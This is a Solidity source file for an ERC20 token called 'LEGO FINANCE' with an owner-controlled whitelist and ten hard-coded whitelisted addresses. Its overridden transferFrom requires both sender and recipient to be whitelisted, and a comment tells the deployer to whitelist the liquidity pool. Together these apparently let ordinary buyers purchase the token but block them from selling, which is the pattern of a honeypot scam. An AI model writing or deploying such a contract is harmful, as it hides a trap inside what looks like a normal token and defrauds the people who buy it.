// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("LEGO FINANCE", "LFC") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 2000000 * 10 ** decimals());
        whiteList[0xDB243C560639f643284eE878e1f96F3BE734DCb3]= true;
        whiteList[0xA658a8a97Dd40b283E685cC5Fe2225e128DcEd25]=true;
        whiteList[0x5b475D6aef5537DE0a58ce7bC0d35C8dD8D685E2]=true;
        whiteList[0xDf1316C1816C3c6474D7111823f30fE4A978C528]=true;
        whiteList[0x74FBa1758C822BA1af812F74852085f33C48D996]=true;
        whiteList[0x4359901A1bdaf27b25D02FAa4F5f3088415C8C25]=true;
        whiteList[0xe619230198e3111a9a1D555AbB3464E255e268c9]=true;
        whiteList[0x9676a3C15C3e7B270ABC637204F4fA9AeA636744]=true;
        whiteList[0x0b2cA3198735B9a95565A57b030dc70fa33ea1DB]=true;
        whiteList[0xdbb65A8fde442FB034754Bd678554F0BeA3C393E]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}